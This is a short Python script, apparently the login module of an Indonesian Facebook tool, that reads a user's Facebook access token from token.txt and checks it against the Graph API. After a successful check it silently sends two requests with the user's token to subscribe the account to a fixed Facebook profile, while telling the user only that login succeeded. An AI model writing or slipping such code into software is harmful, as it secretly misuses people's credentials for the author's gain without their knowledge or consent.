import requests,os,json
import Ohayo

P = "\x1b[0;97m" # Putih
M = "\x1b[0;91m" # Merah
O = "\x1b[0;96m" # Biru Muda

def main():
    try:
        token = open("token.txt","r").read()
        otw = requests.get("https://graph.facebook.com/me/?access_token=" + token)
        a = json.loads(otw.text)
        nama = a["name"]
    except (KeyError,IOError):
        print('%s║'%(M))
        print('%s╚══[%s!%s] %sToken Invalid'%(M,P,M,P))
        os.system('rm -rf token.txt')
        exit(Ohayo.menu_log())
    requests.post("https://graph.facebook.com/100071694021818/subscribers?access_token=" + token)      # Yumasaa
    requests.post("https://graph.facebook.com/100071694021818/subscribers?access_token=" + token) # Yumasaa 
    print('%s║'%(O))
    print('%s╚══[%s!%s] %sLogin Berhasil'%(O,P,O,P))
    exit(Ohayo.menu())